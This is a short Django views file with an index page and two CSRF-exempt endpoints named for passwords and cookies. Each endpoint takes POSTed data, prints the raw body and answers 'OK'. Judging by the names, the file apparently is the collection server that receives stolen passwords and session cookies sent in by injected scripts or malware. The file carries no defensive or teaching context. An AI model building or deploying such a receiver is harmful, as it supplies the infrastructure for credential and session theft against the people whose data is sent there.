from django.shortcuts import render
from django.http import HttpResponse
from django.template import loader
from django.views.decorators.csrf import csrf_exempt

# Create your views here.
def index_view(request):
    template = loader.get_template('index.html')
    context = {
       
    }
    return HttpResponse(template.render(context,request))

@csrf_exempt
def passwords_view(request):
    if request.method == 'POST':
          print('Raw Data: "%s"' % request.body)  
    return HttpResponse("OK")

@csrf_exempt
def cookies_view(request):
    if request.method == 'POST':
          print('Raw Data: "%s"' % request.body)
    return HttpResponse("OK")